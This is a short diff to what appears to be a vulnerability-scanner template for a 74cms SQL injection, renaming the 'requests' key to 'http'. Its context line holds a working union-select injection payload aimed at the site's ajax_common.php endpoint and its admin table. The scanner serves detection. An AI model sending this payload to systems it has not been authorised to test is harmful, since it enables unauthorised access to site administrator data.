@@ -8,7 +8,7 @@ info:
     - http://www.2cto.com/article/201405/304552.html
   tags: 74cms,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(123),3+from+qs_admin%23--"
